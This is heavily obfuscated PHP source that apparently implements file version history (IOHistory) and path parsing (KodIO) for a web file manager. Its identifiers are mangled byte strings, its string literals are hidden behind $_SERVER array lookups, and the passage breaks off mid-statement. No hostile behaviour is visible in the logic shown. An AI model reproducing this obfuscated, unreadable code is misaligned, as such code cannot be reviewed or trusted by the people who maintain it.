<?php
 goto AÖ”·ìÂç¾; B¾Üˆ„ì Ï: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $°¾ùôõ¡ =& $_SERVER[äô®•½Â]; $‚î–ÁøŠ = $GLOBALS[$°¾ùôõ¡[6]][$°¾ùôõ¡[92]]; if ($‚î–ÁøŠ[$°¾ùôõ¡[1299]] != 1) { return; } if ($‚î–ÁøŠ[$°¾ùôõ¡[1300]] <= 0) { return; } if (isset($_REQUEST[$°¾ùôõ¡[1301]]) && $_REQUEST[$°¾ùôõ¡[1301]] == $°¾ùôõ¡[91]) { return; } Hook::bind($°¾ùôõ¡[1302], $°¾ùôõ¡[1303]); Hook::bind($°¾ùôõ¡[1304], $°¾ùôõ¡[1305]); Hook::bind($°¾ùôõ¡[1306], $°¾ùôõ¡[1307]); Hook::bind($°¾ùôõ¡[1308], $°¾ùôõ¡[1309]); Hook::bind($°¾ùôõ¡[1310], $°¾ùôõ¡[1311]); Hook::bind($°¾ùôõ¡[1312], $°¾ùôõ¡[1313]); } public static function eventBeforeUpload($ØøÃ®ÈÁ) { if ($ØøÃ®ÈÁ[3] && $ØøÃ®ÈÁ[3] != REPEAT_REPLACE) { return; } $ÇßŒ­½Ù = self::parsePath($ØøÃ®ÈÁ[0]); if (!$ÇßŒ­½Ù) { return; } self::add($ÇßŒ­½Ù); } public static function eventBeforeEdit($ÌÓÆù’±) { $Ïá•ï½ = self::parsePath($ÌÓÆù’±[0]); if (!$Ïá•ï½) { return; } self::add($Ïá•ï½); } public static function eventBeforeCopyFile($³©ÅÔâö, $›‡ó¬Ÿ, $¶€ÏÙèÁ, $©¶¾»Ğ , $ÉõÅ¢…¥, $åÁäßú•) { $Â¸î‹•õ =& $_SERVER[äô®•½Â]; if (isset($¶€ÏÙèÁ->_data[$Â¸î‹•õ[1232]]) && $¶€ÏÙèÁ->_data[$Â¸î‹•õ[1232]]) { return; } $ĞØà­ = $¶€ÏÙèÁ->getPathOuter($©¶¾»Ğ ); $¤àÒ»Èø = self::parsePath($ĞØà­); if (!$¤àÒ»Èø) { return; } self::add($¤àÒ»Èø); } public static function eventBeforeRename($ñËØğµö) { $ßßÏŞ³ı =& $_SERVER[äô®•½Â]; $„È‡ÎªÛ = self::parsePath($ñËØğµö[0]); if (!$„È‡ÎªÛ) { return; } $â¬Ñ¢Ì = self::checkInHistory($„È‡ÎªÛ); if (!$â¬Ñ¢Ì) { return; } if ($â¬Ñ¢Ì[$ßßÏŞ³ı[33]] == $ßßÏŞ³ı[233]) { $ˆ÷Èâ = self::listData($„È‡ÎªÛ); if ($ˆ÷Èâ && $ˆ÷Èâ[$ßßÏŞ³ı[456]]) { self::moveHistory($„È‡ÎªÛ, $ñËØğµö[1]); } } else { IO::rename($â¬Ñ¢Ì[$ßßÏŞ³ı[87]], $ñËØğµö[1]); } } public static function eventBeforeMove($áôÅ“) { $Š‰Ş„«û =& $_SERVER[äô®•½Â]; $æúáùø = self::parsePath($áôÅ“[0]); if (!$æúáùø) { return; } $œœÜ¡Ï = self::parsePath($áôÅ“[1]); if (!$œœÜ¡Ï) { return; } $¼ì¨¦õ = $áôÅ“[3]; $Ì˜ïÓ²‡ = self::checkInHistory($æúáùø); if (!$Ì˜ïÓ²‡) { return; } $şå‚ƒË = self::pathHistory($œœÜ¡Ï); if ($Ì˜ïÓ²‡[$Š‰Ş„«û[33]] == $Š‰Ş„«û[233]) { $˜ ĞÓñ¤ = self::listData($æúáùø); $Ïµ¢î¾« = rtrim($œœÜ¡Ï, $Š‰Ş„«û[8]) . $Š‰Ş„«û[8] . ($¼ì¨¦õ ? $¼ì¨¦õ : get_path_this($æúáùø)); $ôŒùíñ– = self::listData($Ïµ¢î¾«); if ($˜ ĞÓñ¤ && $˜ ĞÓñ¤[$Š‰Ş„«û[456]] && $ôŒùíñ– && $ôŒùíñ–[$Š‰Ş„«û[456]]) { return self::clear($æúáùø); } if ($˜ ĞÓñ¤ && $˜ ĞÓñ¤[$Š‰Ş„«û[456]]) { self::moveHistory($æúáùø, $¼ì¨¦õ, $şå‚ƒË); } } else { IO::move($Ì˜ïÓ²‡[$Š‰Ş„«û[87]], $şå‚ƒË, !1, $¼ì¨¦õ); self::clearEmptyFolder(IO::pathFather($Ì˜ïÓ²‡[$Š‰Ş„«û[87]])); } } public static function eventAfterRemove($ó¯³Á×¬, $öĞØ“ù) { $Î°àö„÷ =& $_SERVER[äô®•½Â]; if (!$öĞØ“ù) { return; } $§£Ô˜ô = self::parsePath($ó¯³Á×¬[0]); if (!$§£Ô˜ô) { return; } $ôË¹É» = self::checkInHistory($§£Ô˜ô); if (!$ôË¹É») { return; } if ($ôË¹É»[$Î°àö„÷[33]] == $Î°àö„÷[233]) { $ÊûÅ˜ïÂ = self::listData($§£Ô˜ô, !1); if ($ÊûÅ˜ïÂ && $ÊûÅ˜ïÂ[$Î°àö„÷[456]]) { self::clear($§£Ô˜ô, !1); } } else { IO::remove($ôË¹É»[$Î°àö„÷[87]]); self::clearEmptyFolder(IO::pathFather($ôË¹É»[$Î°àö„÷[87]])); } } private static function checkInHistory($öÕèŒ˜û) { $è€§ìõî = self::pathHistory($öÕèŒ˜û); if (!IO::exist($è€§ìõî)) { $è€§ìõî .= $_SERVER[äô®•½Â][1314]; } return IO::exist($è€§ìõî) ? IO::info($è€§ìõî) : !1; } private static function parsePath($¾öÇ°¸Ä) { $ªìÍ¾¯ =& $_SERVER[äô®•½Â]; if (!$¾öÇ°¸Ä) { return !1; } if (isset($GLOBALS[$ªìÍ¾¯[1315]]) && $GLOBALS[$ªìÍ¾¯[1315]]) { return; } $›¢˜Õ¹ı = KodIO::parse($¾öÇ°¸Ä); $ØüœÔİª = $›¢˜Õ¹ı[$ªìÍ¾¯[33]]; $ú×ş²ÁÕ = !$ØüœÔİª || $ØüœÔİª == KodIO::KOD_IO || $ØüœÔİª == KodIO::KOD_SHARE_ITEM; if (!$ú×ş²ÁÕ || !$›¢˜Õ¹ı[$ªìÍ¾¯[1316]]) { return !1; } if (substr($¾öÇ°¸Ä, 0, strlen(DATA_PATH . $ªìÍ¾¯[1317])) == DATA_PATH . $ªìÍ¾¯[1317]) { return !1; } if ($ØüœÔİª == KodIO::KOD_SHARE_ITEM) { $Ê Ñ˜Ğæ = IO::init($¾öÇ°¸Ä); if ($Ê Ñ˜Ğæ->pathParse[$ªìÍ¾¯[1228]]) { return self::parsePath($Ê Ñ˜Ğæ->pathParse[$ªìÍ¾¯[1228]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $øá“õŒÇ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ªìÍ¾¯[1318]); foreach ($øá“õŒÇ as $ª°…¯ Ø) { if (!$ØüœÔİª && substr($¾öÇ°¸Ä, 0, strlen($ª°…¯ Ø)) == $ª°…¯ Ø) { return !1; } } self::log($GLOBALS[$ªìÍ¾¯[1222]] . $ªìÍ¾¯[1319] . $¾öÇ°¸Ä); return $¾öÇ°¸Ä; } private static function pathHistory($‹¼Ú’ç) { $Â±õÌ• =& $_SERVER[äô®•½Â]; $¸Š©˜„ = self::$_historyBase . ltrim(KodIO::clear($‹¼Ú’ç), $Â±õÌ•[8]); $¸Š©˜„ = str_replace(array($Â±õÌ•[1320]), array($Â±õÌ•[1321]), $¸Š©˜„); return $¸Š©˜„; } public static function log($¤Óìˆô‹) { } public static function historyCount($¼—ë»È¹) { $ïû¥¸êƒ =& $_SERVER[äô®•½Â]; $Ü½°÷· = array(); $ÇøÔ÷ãÓ = array(); foreach ($¼—ë»È¹ as $™ä‚«åÊ) { $äßÉÎ‡Î = get_path_father($™ä‚«åÊ); if (!$ÇøÔ÷ãÓ[$äßÉÎ‡Î]) { $ÇøÔ÷ãÓ[$äßÉÎ‡Î] = array(); } $ÇøÔ÷ãÓ[$äßÉÎ‡Î][] = get_path_this($™ä‚«åÊ); } foreach ($ÇøÔ÷ãÓ as $äßÉÎ‡Î => $Ì÷Èá¶») { $“…ªËˆÊ = self::parsePath($äßÉÎ‡Î); if (!$“…ªËˆÊ) { continue; } foreach ($Ì÷Èá¶» as $™ƒê¸»‡) { $Èç®¸Ë = self::listData(rtrim($“…ªËˆÊ, $ïû¥¸êƒ[8]) . $ïû¥¸êƒ[8] . $™ƒê¸»‡, !1); if ($Èç®¸Ë && $Èç®¸Ë[$ïû¥¸êƒ[456]]) { $Ü½°÷·[rtrim($äßÉÎ‡Î, $ïû¥¸êƒ[8]) . $ïû¥¸êƒ[8] . $™ƒê¸»‡] = count($Èç®¸Ë[$ïû¥¸êƒ[456]]); } } } return $Ü½°÷·; } public static function add($˜±ä—Õû) { $‰½—ºÕ =& $_SERVER[äô®•½Â]; $áÄ°É¼Ñ = self::listData($˜±ä—Õû); if (!$áÄ°É¼Ñ) { return; } $Å›…Ø§Á = Model($‰½—ºÕ[836])->get($‰½—ºÕ[1322]); $È‚–ë›¹ = intval($GLOBALS[$‰½—ºÕ[6]][$‰½—ºÕ[92]][$‰½—ºÕ[1300]]); $î¸Ûï• = $Å›…Ø§Á == $‰½—ºÕ[1323] ? min(5, $È‚–ë›¹) : $È‚–ë›¹; if ($È‚–ë›¹ <= 0) { return; } $×ïıĞÛÂ = IO::info($˜±ä—Õû); $·†‚Š‰ú = $áÄ°É¼Ñ[$‰½—ºÕ[456]]; if ($×ïıĞÛÂ[$‰½—ºÕ[79]] == 0) { return; } if ($×ïıĞÛÂ[$‰½—ºÕ[79]] >= 1024 * 1024 * 500) { return !1; } $¡ç£Œİ = IO::hashSimple($˜±ä—Õû); if ($·†‚Š‰ú && $·†‚Š‰ú[0][$‰½—ºÕ[688]] == $¡ç£Œİ) { return !0; } if (array_key_exists($‰½—ºÕ[236], $×ïıĞÛÂ) && !$×ïıĞÛÂ[$‰½—ºÕ[236]]) { return !1; } $ì£Ğï˜€ = short_id(time()); $Á³Ú¸ = array($‰½—ºÕ[486] => $ì£Ğï˜€, $‰½—ºÕ[688] => $¡ç£Œİ, $‰½—ºÕ[32] => $×ïıĞÛÂ[$‰½—ºÕ[32]] . $‰½—ºÕ[10] . date($‰½—ºÕ[1324]) . rand_string(1), $‰½—ºÕ[79] => $×ïıĞÛÂ[$‰½—ºÕ[79]], $‰½—ºÕ[538] => USER_ID, $‰½—ºÕ[234] => time(), $‰½—ºÕ[1325] => $‰½—ºÕ[12]); IO::mkdir($áÄ°É¼Ñ[$‰½—ºÕ[1326]]); $úææ‡ì¨ = IO::copy($˜±ä—Õû, $áÄ°É¼Ñ[$‰½—ºÕ[1326]], !1, $Á³Ú¸[$‰½—ºÕ[32]]); if (!$úææ‡ì¨) { self::clearEmptyFolder($áÄ°É¼Ñ[$‰½—ºÕ[1326]]); return !1; } array_unshift($·†‚Š‰ú, $Á³Ú¸); if (count($·†‚Š‰ú) > $î¸Ûï•) { $Áßòƒ• = array_slice($·†‚Š‰ú, $î¸Ûï•); foreach ($Áßòƒ• as $ÅÆ¸Å) { IO::remove($áÄ°É¼Ñ[$‰½—ºÕ[1326]] . $ÅÆ¸Å[$‰½—ºÕ[32]]); } $·†‚Š‰ú = array_slice($·†‚Š‰ú, 0, $î¸Ûï•); } return self::saveData($áÄ°É¼Ñ[$‰½—ºÕ[1327]], $·†‚Š‰ú); } public static function remove($İ’©ÈÉ, $ñ°Ô) { $øÇåÉ =& $_SERVER[äô®•½Â]; $ì¤šæÉÂ = self::listData($İ’©ÈÉ); $Ù­ÓœÍñ = array(); if (!$ì¤šæÉÂ) { return !1; } foreach ($ì¤šæÉÂ[$øÇåÉ[456]] as $’‰³ì¡ú) { if ($’‰³ì¡ú[$øÇåÉ[486]] == $ñ°Ô) { IO::remove($ì¤šæÉÂ[$øÇåÉ[1326]] . $’‰³ì¡ú[$øÇåÉ[32]]); continue; } $Ù­ÓœÍñ[] = $’‰³ì¡ú; } return self::saveData($ì¤šæÉÂ[$øÇåÉ[1327]], $Ù­ÓœÍñ); } public static function clear($¹‹™½Û, $¶Òü¯ßš = true) { $Š±Æ†„… =& $_SERVER[äô®•½Â]; $ïÚ©Âï = self::listData($¹‹™½Û, $¶Òü¯ßš); if (!$ïÚ©Âï) { return !1; } foreach ($ïÚ©Âï[$Š±Æ†„…[456]] as $à«ƒÒıŞ) { IO::remove($ïÚ©Âï[$Š±Æ†„…[1326]] . $à«ƒÒıŞ[$Š±Æ†„…[32]]); } return self::saveData($ïÚ©Âï[$Š±Æ†„…[1327]], array()); } public static function moveHistory($÷¨½Ò§Õ, $à¨Õæù› = '', $ÇßŸ‰”è = '') { $ï®—¸ËÃ =& $_SERVER[äô®•½Â]; $ìğÃ•´ì = self::listData($÷¨½Ò§Õ, !1); if (!$ìğÃ•´ì || !$ìğÃ•´ì[$ï®—¸ËÃ[456]]) { return !1; } $’Ş‹Ş€â = $ï®—¸ËÃ[1314]; $à¨Õæù› = $à¨Õæù› ? $à¨Õæù› : get_path_this($÷¨½Ò§Õ); $ÇßŸ‰”è = $ÇßŸ‰”è ? $ÇßŸ‰”è : $ìğÃ•´ì[$ï®—¸ËÃ[1326]]; $³¾õ°—ş = substr(get_path_this($ìğÃ•´ì[$ï®—¸ËÃ[1327]]), 0, -strlen($’Ş‹Ş€â)); foreach ($ìğÃ•´ì[$ï®—¸ËÃ[456]] as $ï·É¿¶‹ => $šôí‹¿˜) { $ĞØ†ÅÏ = $à¨Õæù› . substr($šôí‹¿˜[$ï®—¸ËÃ[32]], strlen($³¾õ°—ş)); $ÓèÄ”‘² = IO::move($ìğÃ•´ì[$ï®—¸ËÃ[1326]] . $šôí‹¿˜[$ï®—¸ËÃ[32]], $ÇßŸ‰”è, !1, $ĞØ†ÅÏ); if ($ÓèÄ”‘²) { $ìğÃ•´ì[$ï®—¸ËÃ[456]][$ï·É¿¶‹][$ï®—¸ËÃ[32]] = $ĞØ†ÅÏ; } } $ìğÃ•´ì[$ï®—¸ËÃ[1327]] = IO::move($ìğÃ•´ì[$ï®—¸ËÃ[1327]], $ÇßŸ‰”è, !1, $à¨Õæù› . $’Ş‹Ş€â); self::saveData($ìğÃ•´ì[$ï®—¸ËÃ[1327]], $ìğÃ•´ì[$ï®—¸ËÃ[456]]); self::clearEmptyFolder($ìğÃ•´ì[$ï®—¸ËÃ[1326]]); } public static function rollback($À²èİ¬ù, $¨ô•ûÜÊ) { $š¹€”©© =& $_SERVER[äô®•½Â]; $ğø•şü¯ = self::listData($À²èİ¬ù); if (!$ğø•şü¯) { return; } $˜á¦òÔ’ = IO::info($À²èİ¬ù); foreach ($ğø•şü¯[$š¹€”©©[456]] as $Ÿ©†‡ö => $†î”•Ôò) { if ($†î”•Ôò[$š¹€”©©[486]] == $¨ô•ûÜÊ) { self::add($À²èİ¬ù); $È–›ğ½¤ = $ğø•şü¯[$š¹€”©©[1326]] . $†î”•Ôò[$š¹€”©©[32]]; $‘í»áÌ™ = IO::copy($È–›ğ½¤, IO::pathFather($À²èİ¬ù), REPEAT_REPLACE, $˜á¦òÔ’[$š¹€”©©[32]]); if ($‘í»áÌ™) { self::remove($À²èİ¬ù, $¨ô•ûÜÊ); } return $‘í»áÌ™; } } return !1; } public static function setDetail($¿Òª«ÖÜ, $…©ØÂ–¸, $éä×Ş÷‡) { $ı´ãÆ¹§ =& $_SERVER[äô®•½Â]; $”º‹‰ïÔ = self::listData($¿Òª«ÖÜ); if (!$”º‹‰ïÔ) { return; } foreach ($”º‹‰ïÔ[$ı´ãÆ¹§[456]] as $„ÕäÑ³é => $¦‘à¬†) { if ($¦‘à¬†[$ı´ãÆ¹§[486]] == $…©ØÂ–¸) { $”º‹‰ïÔ[$ı´ãÆ¹§[456]][$„ÕäÑ³é][$ı´ãÆ¹§[1325]] = $éä×Ş÷‡; self::saveData($”º‹‰ïÔ[$ı´ãÆ¹§[1327]], $”º‹‰ïÔ[$ı´ãÆ¹§[456]]); return !0; } } return !1; } public static function fileInfo($ª›Òú Ÿ, $‡§»‡Øì) { $âüÁ¦£ =& $_SERVER[äô®•½Â]; $çÔ›ıûÊ = self::listData($ª›Òú Ÿ); if (!$çÔ›ıûÊ) { show_json(LNG($âüÁ¦£[108]), !1); } $¹Š¼Šë› = $âüÁ¦£[12]; foreach ($çÔ›ıûÊ[$âüÁ¦£[456]] as $´™³ôäı => $‚¥¡ı»ú) { if ($‚¥¡ı»ú[$âüÁ¦£[486]] != $‡§»‡Øì) { continue; } $¹Š¼Šë› = $çÔ›ıûÊ[$âüÁ¦£[1326]] . $‚¥¡ı»ú[$âüÁ¦£[32]]; break; } if (!$¹Š¼Šë›) { show_json(LNG($âüÁ¦£[108]), !1); } return IO::info($¹Š¼Šë›); } public static function fileOut($ö‘Ú°œÂ, $ÂúçÉê, $ùÛù¬¥™ = false) { $Ò¡úèõø =& $_SERVER[äô®•½Â]; $äêÉ²ù = self::fileInfo($ö‘Ú°œÂ, $ÂúçÉê); $®†­¸ŒÓ =& $GLOBALS[$Ò¡úèõø[7]]; $ùÛù¬¥™ = isset($®†­¸ŒÓ[$Ò¡úèõø[1277]]) && $®†­¸ŒÓ[$Ò¡úèõø[1277]] == 1; if (isset($®†­¸ŒÓ[$Ò¡úèõø[33]]) && $®†­¸ŒÓ[$Ò¡úèõø[33]] == $Ò¡úèõø[1328]) { return IO::fileOutImage($äêÉ²ù[$Ò¡úèõø[87]], $®†­¸ŒÓ[$Ò¡úèõø[1329]]); } IO::fileOut($äêÉ²ù[$Ò¡úèõø[87]], $ùÛù¬¥™, get_path_this($ö‘Ú°œÂ)); } public static function listData($´¤Ëö÷Ã, $›ÄÖŒ¨© = true) { $ŒîËçµˆ =& $_SERVER[äô®•½Â]; if ($›ÄÖŒ¨© && !IO::exist($´¤Ëö÷Ã)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($´¤Ëö÷Ã, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Î‰•Èô = self::pathHistory($´¤Ëö÷Ã); $¢–‹ó¦ü = array($ŒîËçµˆ[1327] => $Î‰•Èô . $ŒîËçµˆ[1314], $ŒîËçµˆ[1326] => rtrim(get_path_father($Î‰•Èô), $ŒîËçµˆ[8]) . $ŒîËçµˆ[8], $ŒîËçµˆ[456] => array()); $²½£¢¸¥ = IO::getContent($¢–‹ó¦ü[$ŒîËçµˆ[1327]]); if ($²½£¢¸¥) { $üÍæâ¬È = json_decode($²½£¢¸¥, !0); if (is_array($üÍæâ¬È)) { $¢–‹ó¦ü[$ŒîËçµˆ[456]] = $üÍæâ¬È; } } return $¢–‹ó¦ü; } private static function saveData($‰Îá¥ËÕ, $ÑÜ½§à) { $ÕÊÎØ¨¿ =& $_SERVER[äô®•½Â]; self::log($ÕÊÎØ¨¿[1330] . $‰Îá¥ËÕ . $ÕÊÎØ¨¿[74] . count($ÑÜ½§à), $ÕÊÎØ¨¿[817]); if ($ÑÜ½§à) { return IO::setContent($‰Îá¥ËÕ, json_encode($ÑÜ½§à)); } $Ş§‹©ğ¸ = IO::pathFather($‰Îá¥ËÕ); IO::remove($‰Îá¥ËÕ); self::clearEmptyFolder($Ş§‹©ğ¸); return !0; } public static function clearEmptyFolder($…ãÏØŸ ) { $ğÈíûìµ =& $_SERVER[äô®•½Â]; if (trim($…ãÏØŸ , $ğÈíûìµ[8]) == trim(self::$_historyBase, $ğÈíûìµ[8])) { return; } $ àŠ€á = IO::pathFather($…ãÏØŸ ); $È”æƒáà = IO::has($…ãÏØŸ , !0); if ($È”æƒáà[$ğÈíûìµ[242]] > 0 || $È”æƒáà[$ğÈíûìµ[243]] > 0) { return; } IO::remove($…ãÏØŸ ); self::clearEmptyFolder($ àŠ€á); } private static function getBasePath() { $®şûØÚĞ =& $_SERVER[äô®•½Â]; $¦Í¡²–ª = Model($®şûØÚĞ[1331])->get($®şûØÚĞ[1332]); if ($¦Í¡²–ª) { if (!IO::exist($¦Í¡²–ª)) { IO::mkdir($¦Í¡²–ª); } if (get_path_this($¦Í¡²–ª) == $®şûØÚĞ[1317]) { $ŠÎ­Êè = $®şûØÚĞ[1333] . rand_string(8); @rename($¦Í¡²–ª, get_path_father($¦Í¡²–ª) . $®şûØÚĞ[8] . $ŠÎ­Êè); $¦Í¡²–ª = DATA_PATH . $ŠÎ­Êè . $®şûØÚĞ[8]; file_put_contents(DATA_PATH . $®şûØÚĞ[1264], $®şûØÚĞ[12]); Model($®şûØÚĞ[1331])->set($®şûØÚĞ[1332], $¦Í¡²–ª); } return $¦Í¡²–ª; } $¦Í¡²–ª = DATA_PATH . $®şûØÚĞ[1333] . rand_string(8) . $®şûØÚĞ[8]; $¦Í¡²–ª = IO::mkdir($¦Í¡²–ª); $¦Í¡²–ª = rtrim($¦Í¡²–ª, $®şûØÚĞ[8]) . $®şûØÚĞ[8]; file_put_contents($¦Í¡²–ª . $®şûØÚĞ[1264], $®şûØÚĞ[12]); file_put_contents(DATA_PATH . $®şûØÚĞ[1264], $®şûØÚĞ[12]); Model($®şûØÚĞ[1331])->set($®şûØÚĞ[1332], $¦Í¡²–ª); return $¦Í¡²–ª; } } class KodIO { const KOD_SOURCE = "\173\163\157\x75\x72\143\145\x7d"; const KOD_USER_RECYCLE = "\173\x75\x73\145\162\x52\x65\x63\171\143\154\x65\175"; const KOD_USER_FAV = "\x7b\x75\x73\x65\x72\x46\x61\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\145\162\x46\151\x6c\145\x54\141\147\175"; const KOD_USER_FILE_TYPE = "\x7b\165\163\145\162\x46\x69\154\x65\124\x79\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\x6f\x75\160\x52\x6f\157\164\x53\x65\x6c\146\175"; const KOD_USER_SHARE = "\173\165\x73\145\162\123\x68\141\162\145\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\163\x65\162\123\x68\x61\x72\145\x4c\x69\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\141\x72\145\124\157\x4d\145\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\141\162\x65\x49\164\x65\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\x68\x61\162\x65\111\164\x65\x6d\114\151\x6e\x6b\x7d"; const KOD_SEARCH = "\x7b\x73\x65\x61\162\143\150\175"; const KOD_BLOCK = "\x7b\142\x6c\x6f\x63\153\x7d"; const KOD_IO = "\x7b\151\157\x7d"; const KOD_USER_RECENT = "\173\165\163\145\162\122\x65\x6e\x63\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\173\144\x72\151\166\145\162\x7d"; public static function typeList() { $òßñ¢Ÿ† =& $_SERVER[äô®•½Â]; return array($òßñ¢Ÿ†[1334] => self::KOD_SOURCE, $òßñ¢Ÿ†[1335] => self::KOD_USER_RECYCLE, $òßñ¢Ÿ†[1336] => self::KOD_USER_FAV, $òßñ¢Ÿ†[1337] => self::KOD_USER_FILE_TAG, $òßñ¢Ÿ†[1338] => self::KOD_USER_FILE_TYPE, $òßñ¢Ÿ†[1339] => self::KOD_GROUP_ROOT_SELF, $òßñ¢Ÿ†[1340] => self::KOD_USER_SHARE, $òßñ¢Ÿ†[1341] => self::KOD_USER_SHARE_LINK, $òßñ¢Ÿ†[1342] => self::KOD_USER_SHARE_TO_ME, $òßñ¢Ÿ†[1343] => self::KOD_SHARE_ITEM, $òßñ¢Ÿ†[1344] => self::KOD_SHARE_LINK, $òßñ¢Ÿ†[1345] => self::KOD_SEARCH, $òßñ¢Ÿ†[1346] => self::KOD_BLOCK, $òßñ¢Ÿ†[1347] => self::KOD_IO, $òßñ¢Ÿ†[1348] => self::KOD_USER_RECENT, $òßñ¢Ÿ†[1349] => self::KOD_USER_DRIVER); } public static function parse($²ä›¬‰) { $Ñ óºÁ =& $_SERVER[äô®•½Â]; $²ä›¬‰ = self::clear($²ä›¬‰); $äŒÜİ§ = array_values(self::typeList()); preg_match($Ñ óºÁ[1350], $²ä›¬‰, $¯´œÒçÍ); $¸¨Œ¤Æ· = array($Ñ óºÁ[507] => !1, $Ñ óºÁ[1351] => !1, $Ñ óºÁ[504] => !1, $Ñ óºÁ[87] => $²ä›¬‰, $Ñ óºÁ[1248] => !1, $Ñ óºÁ[1247] => $Ñ óºÁ[12]); if (is_array($¯´œÒçÍ) && count($¯´œÒçÍ) == 5) { $³ü–²èÚ = $Ñ óºÁ[1352] . $¯´œÒçÍ[2] . $Ñ óºÁ[413]; if (in_array($³ü–²èÚ, $äŒÜİ§)) { $¸¨Œ¤Æ·[$Ñ óºÁ[1248]] = $¯´œÒçÍ[1]; $¸¨Œ¤Æ·[$Ñ óºÁ[33]] = $³ü–²èÚ; $¸¨Œ¤Æ·[$Ñ óºÁ[1353]] = substr($³ü–²èÚ, 1, -1); $¸¨Œ¤Æ·[$Ñ óºÁ[486]] = $¯´œÒçÍ[3]; } $¸¨Œ¤Æ·[$Ñ óºÁ[1247]] = $¯´œÒçÍ[4]; } if ($¸¨Œ¤Æ·[$Ñ óºÁ[507]] == self::KOD_SOURCE) { $¸¨Œ¤Æ·[$Ñ óºÁ[486]] = intval($¸¨Œ¤Æ·[$Ñ óºÁ[486]]); $¸¨Œ¤Æ·[$Ñ óºÁ[1251]] = $¸¨Œ¤Æ·[$Ñ óºÁ[486]]; } $å˜œ«Ì¤ = array($Ñ óºÁ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $¸¨Œ¤Æ·[$Ñ óºÁ[1316]] = in_array($¸¨Œ¤Æ·[$Ñ óºÁ[33]], $å˜œ«Ì¤); return $¸¨Œ¤Æ·; } public static function isTruePath($ÀãÀÚ½à) { $Àï„¾¼Ì =& $_SERVER[äô®•½Â]; if (substr($ÀãÀÚ½à, 0, 1) != $Àï„¾¼Ì[1352]) { return !0; } if (strpos($ÀãÀÚ½à, $Àï„¾¼Ì[494]) === 0) { return !0; } if (strpos($ÀãÀÚ½à, $Àï„¾¼Ì[1320]) === 0) { return !0; } if (strpos($ÀãÀÚ½à, $Àï„¾¼Ì[1354]) === 0) { return !0; } if (strpos($ÀãÀÚ½à, $Àï„¾¼Ì[1355]) === 0) { return !0; } if (strpos($ÀãÀÚ½à, $Àï„¾¼Ì[1356]) === 0) { return !0; } return !1; } public static function clear($»šÌıç¤) { $…ŞÊ··› =& $_SERVER[äô®•½Â]; $»šÌıç¤ = str_replace(array($…ŞÊ··›[1151], $…ŞÊ··›[288]), $…ŞÊ··›[53], $»šÌıç¤); $»šÌıç¤ = str_replace($…ŞÊ··›[100], $…ŞÊ··›[8], $»šÌıç¤); $ïÕœË€Í = $…ŞÊ··›[1357]; if (substr($»šÌıç¤, 0, 3) == $…ŞÊ··›[1358]) { $»šÌıç¤ = substr($»šÌıç¤, 3); } while (strstr($»šÌıç¤, $ïÕœË€Í)) { $»šÌıç¤ = str_replace($ïÕœË€Í, $…ŞÊ··›[8], $»šÌıç¤); } $»šÌıç¤ = preg_replace($…ŞÊ··›[1359], $…ŞÊ··›[8], $»šÌıç¤); if ($»šÌıç¤ == $…ŞÊ··›[8]) { return $…ŞÊ··›[8]; } $»šÌıç¤ = rtrim($»šÌıç¤, $…ŞÊ··›[8]); return $»šÌıç¤; } public static function pathTrue($œøìˆ¥) { $ë ÒäœÀ =& $_SERVER[äô®•½Â]; if (!$œøìˆ¥) { return $ë ÒäœÀ[12]; } $œøìˆ¥ = str_replace($ë ÒäœÀ[257], $ë ÒäœÀ[8], str_replace($ë ÒäœÀ[1360], $ë ÒäœÀ[8], $œøìˆ¥)); $œøìˆ¥ = str_replace($ë ÒäœÀ[257], $ë ÒäœÀ[8], str_replace($ë ÒäœÀ[1360], $ë ÒäœÀ[8], $œøìˆ¥)); if (!strstr($œøìˆ¥, $ë ÒäœÀ[1358])) { return $œøìˆ¥; } $ÀºÛ£¹‹ = explode($ë ÒäœÀ[8], $œøìˆ¥); foreach ($ÀºÛ£¹‹ as $ùÌ–ãšĞ => $ÓíïÂôä) { if ($ÓíïÂôä !== $ë ÒäœÀ[1361]) { continue; } for ($¯¿ÛìëÚ = $ùÌ–ãšĞ; $¯¿ÛìëÚ >= 0; $¯¿ÛìëÚ--) { if ($ÀºÛ£¹‹[$¯¿ÛìëÚ] === $ë ÒäœÀ[10] || $ÀºÛ£¹‹[$¯¿ÛìëÚ] === $ë ÒäœÀ[1361] || $ÀºÛ£¹‹[$¯¿ÛìëÚ] === -1) { continue; } if ($ÀºÛ£¹‹[$¯¿ÛìëÚ] === $ë ÒäœÀ[12]) { $ÀºÛ£¹‹[$ùÌ–ãšĞ] = -1; break; } $ÀºÛ£¹‹[$ùÌ–ãšĞ] = -1; $ÀºÛ£¹‹[$¯¿ÛìëÚ] = -1; break; } } $ÜÍî¿è° = array(); foreach ($ÀºÛ£¹‹ as $ÓíïÂôä) { if ($ÓíïÂôä !== -1) { $ÜÍî¿è°[] = $ÓíïÂôä; } } $¾Ã™ÇïÖ = implode($ë ÒäœÀ[8], $ÜÍî¿è°); if (strpos($¾Ã™ÇïÖ, $ë ÒäœÀ[1362]) === 0) { $¾Ã™ÇïÖ = $ë ÒäœÀ[1358] . substr($¾Ã™ÇïÖ, strlen($ë ÒäœÀ[1362])); } return $¾Ã™ÇïÖ; } public static function pathUrlClear($ÂîäËæÍ) { $ª™Ìú£ =& $_SERVER[äô®•½Â]; if (!$ÂîäËæÍ) { return $ÂîäËæÍ; } $ÂîäËæÍ = rawurldecode($ÂîäËæÍ); $ÂîäËæÍ = str_replace($ª™Ìú£[1360], $ª™Ìú£[8], $ÂîäËæÍ); if (strpos($ÂîäËæÍ, $ª™Ìú£[76]) > 0) { $ÂîäËæÍ = substr($ÂîäËæÍ, 0, strpos($ÂîäËæÍ, $ª™Ìú£[76])); } if 